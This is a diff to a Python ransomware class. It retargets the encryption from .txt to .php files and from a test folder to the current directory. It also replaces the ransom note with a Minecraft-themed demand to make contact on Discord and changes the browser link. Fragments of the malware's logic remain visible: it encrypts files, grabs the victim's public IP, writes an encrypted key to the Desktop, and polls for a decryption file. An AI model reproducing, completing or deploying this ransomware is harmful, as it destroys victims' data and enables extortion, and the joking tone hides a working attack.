@@ -22,7 +22,7 @@ class RansomWare:
     
     # File exstensions to seek out and Encrypt
     file_exts = [
-        'txt',
+        'php'
        # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
        # -and leaves other files un-ecnrypted etc.
        # 'png', 
@@ -46,7 +46,7 @@ class RansomWare:
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser('~')
         # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
-        self.localRoot = 'localRoot' # Debugging/Testing
+        self.localRoot = '.' # Debugging/Testing
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         self.publicIP = requests.get('https://api.ipify.org').text
@@ -82,7 +82,7 @@ class RansomWare:
             # Write encrypted fernet key to file
             f.write(enc_fernent_key)
         # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
-        with open(f'{self.sysRoot}\Desktop\EMAIL_ME.txt', 'wb') as fa:
+        with open(f'{self.sysRoot}\Desktop\XD.txt', 'wb') as fa:
             fa.write(enc_fernent_key)
         # Assign self.key to encrypted fernet key
         self.key = enc_fernent_key
@@ -130,7 +130,7 @@ class RansomWare:
 
     @staticmethod
     def what_is_bitcion():
-        url = 'https://bitcoin.org'
+        url = 'https://minecraft.net'
         # Open browser to the https://bitcoin.org so they know what bitcoin is
         webbrowser.open(url)
 
@@ -149,17 +149,7 @@ class RansomWare:
         date = datetime.date.today().strftime('%d-%B-Y')
         with open('RANSOM_NOTE.txt', 'w') as f:
             f.write(f'''
-Congratulations, you just got ransomwared. Do not panic, I can easily decrypt your stuff. DO NOT MESS WITH ANY
-OF THESE FILES. DOING SO WILL RESULT IN A PERMANENT LOSS OF YOUR SERVICES. Carefully follow the following directions:
-
-1. Create a txt file in this directory that describes your favorite block in Minecraft. The description must be
-    thorough, and it must be verified by the authorities.
-
-2. Contact your supervisor once you have completed this task, and wait for me to place a file 'PUTMEONYOURDESKTOP.txt' in this directory.
-
-3. Place this file on your Desktop and it should decrypt your files.
-
-DO NOT TRY TO DECRYPT YOUR FILES ON YOUR OWN. IT WONT WORK TRUST ME.
+Your chest of diamonds have been ransomwared. If you want them back, contact us on discord. #epicminecraftplays #gg10ez #rekt
 ''')
 
 
@@ -210,7 +200,7 @@ DO NOT TRY TO DECRYPT YOUR FILES ON YOUR OWN. IT WONT WORK TRUST ME.
                 print(e) # Debugging/Testing
                 pass
             time.sleep(10) # Debugging/Testing check for file on desktop ever 10 seconds
-            print('Checking for PUT_ME_ON_DESKTOP.txt') # Debugging/Testing
+            #print('Checking for PUT_ME_ON_DESKTOP.txt') # Debugging/Testing
             # Would use below code in real life etc... above 10secs is just to "show" concept
             # Sleep ~ 3 mins
             # secs = 60
